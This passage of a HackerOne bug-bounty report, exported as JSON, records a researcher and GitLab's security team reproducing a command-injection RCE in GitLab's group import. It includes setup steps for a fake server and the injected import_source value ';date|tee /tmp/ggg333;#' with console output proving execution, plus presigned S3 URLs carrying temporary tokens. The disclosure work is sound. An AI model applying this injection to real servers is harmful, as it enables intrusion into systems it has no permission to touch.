          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qmx99ycmy9yhkp7m97fepo3wk9cm?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-23_at_7.58.49_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-23_at_7.58.49_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48d01c53b635cff72b254bc9049f6ac998efc5f02e956c9214c086c2be31cfef"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17254883,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @nmalcolm_gitlab,\n\nI forgot to mention that you also need to edit line 50 and change `host = \"gitlab.wbowling.info\"` to point to your own gitlab host, I think `gdk.test:3000` should work so long as the machine running the proxy can resolve it. The only other thing is that I was using the `http` ngrok tunnel not https, not sure if that makes a difference?\n\nIf you always set the `host` variable (eg remove the `if host.endswith(\"ngrok.io\"):` condition` then you should be able to access your gitlab instance via http://localhost:5000, does that work?\n\nCheers,\nWill ",
      "automated_response": false,
      "created_at": "2022-06-23T08:34:14.122Z",
      "updated_at": "2022-06-23T08:34:14.122Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17256280,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @vakzz ,\n\nWe have been trying to reproduce it, but we are unable to get the code executed. The import is done, we wait couple of minutes but we don't see that file written, neither the logs are showing up the error message.\n\nWould you be able to provide us with a video? That would highly help us in seeing what we are missing on our side to reproduce it.\n\nThank you!\nVitor\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-06-23T09:56:49.893Z",
      "updated_at": "2022-06-23T09:56:49.893Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17256543,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @vdesousa,\n\nSure thing, here is a recording:\n\n {F1785625}\n\nIt is probably more like 5-6 minutes before the command is executed as it only happens after `wait_for_archived_file` yields (which is 255 seconds). \n\nCheers,\nWill",
      "automated_response": false,
      "created_at": "2022-06-23T10:26:12.691Z",
      "updated_at": "2022-06-23T10:26:35.922Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1785625,
          "filename": "gitlab_rce.mp4",
          "type": "video/mp4",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y4fs7sr6aswonsnpbu5v0c4n1fs3?response-content-disposition=attachment%3B%20filename%3D%22gitlab_rce.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab_rce.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=67b3d22a64ffe4f7de56329244fe394ee4bfd6cba3b7498e83ad01120b1b23ab"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17264722,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @vdesousa,\n\nWere you able to reproduce the issue? Sorry the python proxy wasn't working, I'd only tested it with the omnibus edition running in a vm. All it does is add the `template_name` and `import_source` fields to the response for the `GetProjectQuery` query, as well as fixing the path for fetching the project api calls (it was trying to use `/api/v4/projects/export_group/export_project/export_relations` instead of `/api/v4/projects/22/export_relations` and 404ing).\n\nThe proxy isn't really needed it was just the simplest way to trigger it, a fake server could be written instead that just returns the required data directly. I can put together something like that if it helps?\n\nCheers,\nWill",
      "automated_response": false,
      "created_at": "2022-06-24T00:09:46.947Z",
      "updated_at": "2022-06-24T00:09:46.947Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17266320,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@vakzz ,\n\nWe have an issue when importing, the group is imported but the project inside the group isn't. We are trying to figure out why (it's F&F day today so we will be on limited availability).\n\nHave you faced something similar on your testing previously?\n\nCheers,\nVitor",
      "automated_response": false,
      "created_at": "2022-06-24T06:24:03.943Z",
      "updated_at": "2022-06-24T06:24:03.943Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17269912,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @vdesousa,\n\nSo long as `::Feature.enable(:bulk_import_projects)` is enabled then it should also import the projects for a group. Here is a pure python version that doesn't proxy to a real gitlab instance: {F1787257}. You should be able to unzip it then:\n1. run the server with `FLASK_APP=fake_server.py FLASK_ENV=development flask run`\n1. start ngrok with `ngrok http 5000`\n1. visit http://GITLAB_HOST/groups/new#import-group-pane and enter in the ngrok url and anything for the token\n1. import `group1` to any destination\n1. after a minute or so you should be able to visit the new group and see that there is a `project1` there\n1. clicking on it should show a message `Import in progress`\n1. from a rails console you can confirm that the newest project has `import_type=gitlab_project` and `import_source=command`\n1. after around 5 minutes the project page will change from `Import in progress` to `The repository could not be imported.` and the command will have executed\n\n```ruby\np = Project.last\n=> #<Project id:36 import_ggg_bbb/project1>>\nirb(main):015:0> p.import_state\n=> #<ProjectImportState id: 17, project_id: 36, retry_count: 0, last_update_started_at: \"2022-06-24 11:50:43.713258000 +0000\", last_update_scheduled_at: \"2022-06-24 11:50:43.645620000 +0000\", next_execution_timestamp: nil, status: \"started\", jid: \"c0572388311abf20eb8bd014\", last_error: nil, last_update_at: nil, last_successful_update_at: nil, correlation_id_value: \"2790bc18d55b4db8f8f9866efbd79ae1\">\nirb(main):016:0> p.import_type\n=> \"gitlab_project\"\nirb(main):017:0> p.import_source\n=> \";date|tee /tmp/ggg333;#\"\nirb(main):026:0> p.import_state.last_error\n=> \"Error importing repository  into import_ggg_bbb/project1 - command exited with error code 2: tar (child): ;date|tee [FILTERED] Cannot open: No such file or directory\\ntar (child): Error is not recoverable: exiting now\\ntar: Child returned status 2\\ntar: Error is not recoverable: exiting now and No such file or directory @ rb_sysopen - [FILTERED]\"\n```\n\n```bash\nvagrant@gitlab:~$ cat /tmp/ggg333\nFri Jun 24 11:54:58 UTC 2022\n```\n\nCheers,\nWill",
      "automated_response": false,
      "created_at": "2022-06-24T12:03:04.107Z",
      "updated_at": "2022-06-24T12:03:04.107Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1787257,
          "filename": "fake_server.zip",
          "type": "application/zip",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/36jwpdpqr5ycw9cf88l1y7l89nwc?response-content-disposition=attachment%3B%20filename%3D%22fake_server.zip%22%3B%20filename%2A%3DUTF-8%27%27fake_server.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2F